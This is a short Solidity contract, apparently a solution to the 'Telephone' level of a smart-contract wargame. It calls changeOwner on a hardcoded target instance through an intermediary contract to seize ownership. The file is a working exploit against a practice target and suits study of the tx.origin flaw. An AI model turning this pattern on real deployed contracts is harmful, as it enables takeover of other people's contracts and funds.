// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel04.sol";

contract TelephoneAttacker {
    Telephone level04 = Telephone(0xB2679387Bd9dd16eBBd8F76e6035610a0da70bEB);

    function exploit() external {
        level04.changeOwner(msg.sender);
    }
}
